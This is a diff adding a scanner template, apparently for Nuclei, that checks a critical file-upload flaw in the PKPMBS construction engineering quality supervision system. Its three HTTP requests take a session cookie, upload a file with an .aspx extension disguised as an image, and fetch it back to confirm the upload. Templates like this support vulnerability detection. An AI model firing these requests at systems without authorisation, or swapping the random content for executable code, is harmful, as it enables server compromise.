@@ -1,0 +1,72 @@
+id: poc-yaml-pkpmbs-construction-engineering-quality-supervision-system-upload-file
+info:
+  name: PKPMBS Construction Engineering Quality Supervision System File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  filename: '{{rand_base(6)}}'
+  content: '{{rand_base(32)}}'
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - id: check-session
+    method: GET
+    path:
+      - "{{BaseURL}}/Login.cshtml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "ASP.NET_SessionId"
+    extractors:
+      - type: regex
+        name: session_id
+        internal: true
+        part: header
+        regex:
+          - "ASP.NET_SessionId=(.*?);"
+
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/Applications/Forms/SearchSetting/FileUpOrDown.ashx?operation=Fileupload&extName=.aspx&&searchConfigName={{filename}}.aspx"
+    headers:
+      Cookie: "ASP.NET_SessionId={{session_id}};"
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundarybqACRhAMBHmQQAUP"
+    body: |
+      ------WebKitFormBoundarybqACRhAMBHmQQAUP
+      Content-Disposition: form-data; name="Filedata"; filename="1.aspx"
+      Content-Type: image/png
+
+      {{content}}
+      ------WebKitFormBoundarybqACRhAMBHmQQAUP--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{filename}}"
+
+  - id: validate-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/Excel/Templete/{{filename}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{content}}"
